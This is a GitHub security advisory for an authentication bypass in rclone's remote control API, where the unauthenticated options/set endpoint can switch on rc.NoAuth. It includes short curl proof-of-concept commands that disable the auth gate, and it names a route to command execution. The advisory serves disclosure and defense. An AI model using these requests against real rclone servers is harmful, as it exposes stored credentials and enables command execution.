# [C] Rclone: Unauthenticated options/set allows runtime auth bypass, leading to sensitive operations and command execution

## Summary
Severity: Critical
Advisory: GHSA-25qr-6mpr-f7qx
CVE: CVE-2026-41176
CWE: CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-25qr-6mpr-f7qx
Type: github-advisory

## Affected
- Go: `github.com/rclone/rclone` — affected >=1.45.0 <1.73.5

## Details
### Summary
The RC endpoint `options/set` is exposed without `AuthRequired: true`, but it can mutate global runtime configuration, including the RC option block itself. An unauthenticated attacker can set `rc.NoAuth=true`, which disables the authorization gate for many RC methods registered with `AuthRequired: true` on reachable RC servers that are started without global HTTP authentication. This can lead to unauthorized access to sensitive administrative functionality, including configuration and operational RC methods.

### Preconditions

Preconditions for this vulnerability are:

- The rclone remote control API **must** be enabled, either by the `--rc` flag or by running the `rclone rcd` server
- The remote control API **must** be reachable by the attacker - by default rclone only serves the rc to localhost unless the `--rc-addr` flag is in use
- The rc must have been deployed **without** global RC HTTP authentication - so not using `--rc-user`/`--rc-pass`/`--rc-htpasswd`/etc

### Details
The root cause is present from v1.45 onward. Some higher-impact exploitation paths became available in later releases as additional RC functionality was introduced.

The issue is caused by two properties of the RC implementation:

1. `options/set` is exposed without `AuthRequired: true`
2. the RC server enforces authorization for `AuthRequired` calls using the mutable runtime value `s.opt.NoAuth`

Relevant code paths:

- [`fs/rc/config.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/config.go)
  - registers `options/set` without `AuthRequired: true`
  - `rcOptionsSet` reshapes attacker-controlled input into global option blocks

- [`fs/rc/rcserver/rcserver.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/rcserver/rcserver.go)
  - request handling checks:
    - `if !s.opt.NoAuth && call.AuthRequired && !s.server.UsingAuth()`
  - once `rc.NoAuth` is changed to `true`, later `AuthRequired` methods become callable without credentials

This creates a runtime auth-bypass primitive on the RC interface.

After setting `rc.NoAuth=true`, previously protected administrative methods become callable, including configuration and operational endpoints such as:

- `config/listremotes`
- `config/dump`
- `config/get`
- `operations/list`
- `operations/copyfile`
- `core/command`

Relevant code for the second-stage command execution path:

- [`fs/metadata.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/metadata.go)
  - `metadataMapper()` uses `exec.Command(...)`

- [`fs/operations/rc.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/operations/rc.go)
  - `operations/copyfile` is normally `AuthRequired: true`
  - once `rc.NoAuth=true`, it becomes reachable without credentials

This was validating using the following:
- current `master` as of 2026-04-14: `bf55d5e6d37fd86164a87782191f9e1ffcaafa82`
- latest public release tested locally: `v1.73.4`

The issue was also verified on a public amd64 Ubuntu host controlled by the tester, using direct host execution (not containerized PoC execution).

### PoC
#### Minimal reproduction
Start a vulnerable server:

```bash
rclone rcd --rc-addr 127.0.0.1:5572
```

No `--rc-user`, no `--rc-pass`, no `--rc-htpasswd`.

First confirm that a protected RC method is initially blocked:

```bash
curl -sS -X POST http://127.0.0.1:5572/config/listremotes \
  -H 'Content-Type: application/json' \
  --data '{}'
```

Expected result: HTTP 403.

Use unauthenticated `options/set` to disable the auth gate:

```bash
curl -sS -X POST http://127.0.0.1:5572/options/set \
  -H 'Content-Type: application/json' \
  --data '{"rc":{"NoAuth":true}}'
```

Expected result: HTTP 200 `{}`

Then call the same protected method again without credentials:

```bash
curl -sS -X POST http://127.0.0.1:5572/config/listremotes \
  -H 'Content-Type: application/json' \
  --data '{}'
```

Expected result: HTTP 200 with a JSON response such as:

```json
{"remotes":[]}
```

#### Testing performed
This was successfully reproduced:
- on the tester's ocal test environment
- on a public amd64 Ubuntu host controlled by the tester

Using the public host, the following was confirmed:

- unauthenticated `options/set` successfully set `rc.NoAuth=true`
- previously protected RC methods became callable without credentials
- the issue was reproducible through direct host execution

### Impact
This is an authorization bypass on the RC administrative interface.

It can allow an unauthenticated network attacker, on a reachable RC deployment without global HTTP authentication, to disable the intended auth boundary for protected RC methods and gain access to sensitive configuration and operational functionality.

Depending on the enabled RC surface and runtime configuration, this can further enable higher-impact outcomes such as local file read, credential/config disclosure, filesystem enumeration, and command execution.

## References
- https://github.com/rclone/rclone/security/advisories/GHSA-25qr-6mpr-f7qx
- https://nvd.nist.gov/vuln/detail/CVE-2026-41176
- https://github.com/rclone/rclone
- https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/config.go
- https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/rcserver/rcserver.go
